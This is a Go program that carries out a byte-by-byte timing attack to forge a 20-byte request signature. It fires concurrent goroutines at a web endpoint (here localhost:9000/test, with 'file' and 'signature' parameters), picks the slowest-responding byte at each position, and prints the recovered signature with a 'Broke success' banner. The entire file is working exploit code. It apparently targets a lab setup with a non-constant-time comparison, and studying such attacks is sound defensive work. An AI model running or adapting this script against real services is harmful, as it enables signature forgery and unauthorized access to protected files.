package main

import (
	"encoding/hex"
	"fmt"
	"net/http"
	"sync"
	"time"
)

const (
	Target   = "http://localhost:9000/test"
	Filename = "foo"
	Samples  = 5
)

func measure(sig string) time.Duration {
	var total time.Duration
	client := &http.Client{Timeout: 10 * time.Second}

	for i := 0; i < Samples; i++ {
		start := time.Now()
		resp, err := client.Get(fmt.Sprintf("%s?file=%s&signature=%s", Target, Filename, sig))
		if err != nil {
			continue
		}
		resp.Body.Close()
		total += time.Since(start)
	}
	return total / Samples
}

func main() {
	known := make([]byte, 20)
	fmt.Println("[*] Initiating Go concurrent timing attack...")

	for pos := 0; pos < 20; pos++ {
		type result struct {
			b    byte
			cost time.Duration
		}
		resChan := make(chan result, 256)
		var wg sync.WaitGroup

		for b := 0; b < 256; b++ {
			wg.Add(1)
			go func(currentByte byte) {
				defer wg.Done()
				testSig := make([]byte, 20)
				copy(testSig, known)
				testSig[pos] = currentByte

				cost := measure(hex.EncodeToString(testSig))
				resChan <- result{currentByte, cost}
			}(byte(b))
		}

		wg.Wait()
		close(resChan)

		var bestByte byte
		var maxTime time.Duration
		for r := range resChan {
			if r.cost > maxTime {
				maxTime = r.cost
				bestByte = r.b
			}
		}

		known[pos] = bestByte
		fmt.Printf("[+] byte %d: %02x | time consuming: %v | current signature: %s\n",
			pos+1, bestByte, maxTime, hex.EncodeToString(known))
	}

	fmt.Printf("\n[!!!] Broke success: %s\n", hex.EncodeToString(known))
}
